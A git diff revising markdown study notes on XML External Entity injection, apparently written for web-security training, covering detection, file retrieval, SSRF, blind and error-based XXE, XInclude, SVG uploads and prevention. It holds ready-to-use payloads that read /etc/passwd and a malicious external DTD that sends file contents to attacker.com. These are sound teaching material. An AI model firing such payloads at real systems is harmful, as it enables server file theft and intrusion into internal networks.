@@ -1,126 +1,315 @@
+# XML External Entity Injection
 
-# XML External Enitity Injection 
+XXE Injection is a web security vulnerability that occurs when an application parses XML input and allows external entities to be processed. XXE allows attackers to interfere with XML processing and interact with internal or external resources accessible by the server.
 
-XXE Injection is a web security vulnerability that occurs when an application parses XML input and allows external entities to be processed. It allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
+XXE can allow:
+
+* File retrieval
+* SSRF
+* Internal network interaction
+* Out-of-band data exfiltration
 
 ---
+
 ## Detection
 
-Detecting XML External Entity (XXE) Injection involves checking whether an application parses XML input and allows external entities to be resolved.
+XXE detection involves identifying XML processing functionality and testing whether external entities are resolved.
 
-Signs that an application processes XML:
-• Content-Type: application/xml or text/xml
-• XML formatted request bodies (`<tag>`)
-• SOAP endpoints
-• XML file uploads (SVG, DOCX, XLSX)
-• XML parsing error messages
+Signs an application processes XML:
 
-**Internal Entity**: If an entity is declared within a DTD it is called an internal entity. Syntax: `<!ENTITY entity_name "entity_value">`
+* `Content-Type: application/xml`
+* `Content-Type: text/xml`
+* SOAP requests
+* XML request bodies
+* XML parsing errors
+* XML file uploads:
 
-**External Entity**: If an entity is declared outside a DTD it is called an external entity. Identified by `SYSTEM`. Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
+  * SVG
+  * DOCX
+  * XLSX
 
-Internal Entity Example Code: 
+Applications sometimes accept XML even when another format is expected.
+
+### Internal Entity
+
+Internal entities are declared within the DTD.
+
+Syntax:
+
+```xml
+<!ENTITY entity_name "entity_value">
 ```
-<!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
- <userInfo>
+
+Example:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE replace [
+<!ENTITY example "Doe">
+]>
+<userInfo>
   <firstName>John</firstName>
   <lastName>&example;</lastName>
- </userInfo>
+</userInfo>
 ```
 
-Types of entities in XML:
+### External Entity
 
-| Type             | Prefix   | Where usable                | Example                                             |
-| ---------------- | -------- | --------------------------- | --------------------------------------------------- |
-| General entity   | `&name;` | Inside XML document content | `<firstName>&name;</firstName>`                     |
-| Parameter entity | `%name;` | Only inside the DTD         | `<!DOCTYPE replace [<!ENTITY name "Doe"> %name; ]>` |
+External entities are declared outside the XML document using `SYSTEM`.
+
+Syntax:
+
+```xml
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+```
+
+### Types of Entities
+
+| Type             | Prefix   | Usage               |
+| ---------------- | -------- | ------------------- |
+| General Entity   | `&name;` | Inside XML document |
+| Parameter Entity | `%name;` | Inside DTD          |
+
+General entities are commonly used in reflected XXE.
+Parameter entities are heavily used in blind XXE exploitation.
 
 ---
 
 ## XXE to Retrieve Files
 
-This happens when the XML parser **resolves external entities** and the application reflects the parsed value in the response.
-
-Original Request Body:
-```
-<?xml version="1.0" encoding="UTF-8"?> 
-<stockCheck><productId>381</productId></stockCheck>
-```
-
-Classic XXE payload to retrieve `/etc/passwd` file: 
-```
-<?xml version="1.0" encoding="UTF-8"?> 
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
-<stockCheck><productId>&xxe;</productId></stockCheck>
-```
-
-### XInclude attacks
-
-Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. Classic XXE attack, because you don't control the entire XML document
-
-XInclude XXE Payload:
-```
-`<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>`
-```
-
-HTTP Request Body:
-```
-# Original Body
-productId=1&storeId=1
-
-# Malicious
-
-productId=1<foo xmlns:xi="http://www.w3.org/2001/XInclude">
-<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
-```
-
-### XXE attacks via file upload
-
-Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. 
-
-SVG Image file Example: 
-```
-`<?xml version="1.0" standalone="yes"?>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
-<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"           xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
-	<text font-size="16" x="0" y="16">&xxe;</text>
-</svg>`
-```
-
-### XXE attacks via modified content type
+Occurs when external entities are resolved and reflected in the response.
 
 Original Request:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+  <productId>381</productId>
+</stockCheck>
 ```
-POST /action HTTP/1.0 
-Content-Type: application/x-www-form-urlencoded 
-Content-Length: 7 
+
+XXE Payload:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<stockCheck>
+  <productId>&xxe;</productId>
+</stockCheck>
+```
+
+If vulnerable, the response may contain file contents.
+
+Common file targets:
+
+Linux:
+
+```text
+/etc/passwd
+/etc/hostname
+/etc/issue
+```
+
+Windows:
+
+```text
+C:\windows\win.ini
+```
+
+---
+
+## XXE to Perform SSRF Attacks
+
+XXE can be used for SSRF against internal systems.
+
+Targets:
+
+* Internal applications
+* Internal APIs
+* Cloud metadata endpoints
+* Internal ports/services
+
+Payload:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/">
+]>
+<stockCheck>
+  <productId>&xxe;</productId>
+</stockCheck>
+```
+
+Cloud metadata endpoints are high-value SSRF targets.
+
+---
+
+## Blind XXE Vulnerabilities
+
+Blind XXE occurs when the application does not reflect entity output in responses.
+
+In blind XXE:
+
+* No visible response changes occur
+* File contents are not directly returned
+* Out-of-band interaction is required
+
+Burp Collaborator is commonly used for detection.
+
+### Blind XXE Detection
+
+Payload:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-ID">
+]>
+<stockCheck>
+  <productId>&xxe;</productId>
+</stockCheck>
+```
+
+If the server performs a DNS or HTTP request to the collaborator domain, XXE exists.
+
+DNS interactions alone can confirm XXE.
+
+---
+
+## Blind XXE Using External DTD
+
+External DTDs are commonly used in blind XXE exploitation to exfiltrate data out-of-band.
+
+XML Payload:
+
+```xml
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">
+%xxe;
+]>
+```
+
+Malicious DTD:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
+%eval;
+%exfil;
+```
+
+Parameter entities are heavily used in DTD exploitation.
+
+---
+
+## Error-Based XXE
+
+Some XML parsers leak file contents through parser errors.
+
+Payload:
+
+```xml
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%xxe;'>">
+%eval;
+%error;
+]>
+```
+
+Useful when direct reflection is unavailable.
+
+---
+
+## XInclude Attacks
+
+XInclude attacks work when user input is embedded into a server-side XML document and full DTD control is not possible.
+
+Payload:
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+```
+
+Useful when only partial XML injection is possible.
+
+---
+
+## XXE via File Upload
+
+Some uploaded file formats contain XML or XML subcomponents.
+
+Common targets:
+
+* SVG
+* DOCX
+* XLSX
+
+SVG XXE Example:
+
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [
+<!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text>&xxe;</text>
+</svg>
+```
+
+SVG uploads are common XXE vectors.
+
+---
+
+## XXE via Modified Content-Type
+
+Some applications accept XML even when another format is expected.
+
+Original Request:
+
+```http
+POST /action HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
 
 foo=bar
 ```
 
-Malicious Request:
-```
-POST /action HTTP/1.0 
-Content-Type: text/xml 
-Content-Length: 52 
+Modified Request:
 
-<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
+```http
+POST /action HTTP/1.1
+Content-Type: text/xml
+
+<?xml version="1.0"?>
+<foo>bar</foo>
 ```
 
+Changing content-type may expose hidden XML parsing functionality.
 
 ---
-## XXE to Perform SSRF Attacks
 
-XXE can be combined with the SSRF Vulnerability to target another service on the network.
+## Local DTD Repurposing
 
-```
-<?xml version="1.0" encoding="UTF-8"?> 
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
-<stockCheck><productId>&xxe;</productId></stockCheck>
-```
+Some operating systems contain local DTD files that can be abused during blind XXE exploitation.
+
+Useful when:
+
+* External DTDs are blocked
+* Outbound traffic is restricted
+
+Common in advanced blind XXE exploitation.
 
 ---
-## Blind XXE Vulnerabilities
 
-In Blind XXE application does not return the values of any defined external entities in its responses, and so direct retrieval of server-side files is not possible.
+## Prevention
+
+* Disable DTD processing
+* Disable external entities
+* Use secure XML parsers
+* Validate XML input
+* Prefer JSON over XML when possible
